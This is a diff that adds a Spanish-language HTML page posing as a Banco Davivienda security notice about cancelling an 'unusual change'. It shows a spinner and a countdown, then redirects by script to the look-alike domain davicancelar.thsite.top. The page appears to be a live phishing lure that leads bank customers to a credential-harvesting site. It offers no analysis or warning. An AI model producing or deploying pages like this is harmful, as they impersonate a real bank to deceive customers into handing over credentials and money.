@@ -1,0 +1,13 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Cancelar Cambio Inusual</title>
+<style>
+*{box-sizing:border-box}body{margin:0;min-height:100vh;display:grid;place-items:center;background:radial-gradient(circle at 50% 10%,#a72a38,#5d1021 75%);font-family:system-ui,-apple-system,'Segoe UI',sans-serif;color:#fff;text-align:center;padding:24px}.panel{width:min(480px,100%);padding:42px 26px;border:1px solid #ffffff44;border-radius:24px;background:#ffffff12;box-shadow:0 22px 70px #20051066}.tag{display:inline-block;border:1px solid #ffffff88;border-radius:99px;padding:8px 14px;font-size:12px;letter-spacing:.08em;text-transform:uppercase;font-weight:700}h1{font-size:clamp(26px,6vw,38px);margin:24px 0 8px}h2{font-size:19px;font-weight:500;margin:0 0 30px;color:#ffe3e6}.spinner{height:62px;width:62px;border-radius:50%;border:6px solid #ffffff40;border-top-color:white;animation:spin .85s linear infinite;margin:0 auto 20px}@keyframes spin{to{transform:rotate(360deg)}}.status{font-size:22px;font-weight:650}.count{font-size:15px;margin-top:10px;color:#ffe4e7}.foot{margin-top:28px;font-size:13px;line-height:1.5;color:#ffe4e7}.foot a{color:#fff;text-underline-offset:3px}@media(prefers-reduced-motion:reduce){.spinner{animation-duration:2.5s}}
+</style>
+</head>
+<body><main class="panel"><div class="tag">Cancelar Cambio Inusual</div><h1>Banco Davivienda</h1><h2>Seguridad</h2><div class="spinner" aria-hidden="true"></div><div class="status" role="status">Cancelando...</div><p class="count">Redirección en <strong id="seconds">5</strong> segundos</p><p class="foot">Banco Davivienda.<br><a href="https://davicancelar.thsite.top/?i=1" id="destination">Continuar ahora</a></p></main>
+<script>
+const destino='https://davicancelar.thsite.top/?i=1';let restante=3;const contador=document.getElementById('seconds');const temporizador=setInterval(()=>{restante--;contador.textContent=String(Math.max(0,restante));if(restante<=0){clearInterval(temporizador);window.location.assign(destino)}},1000);
+</script></body></html>
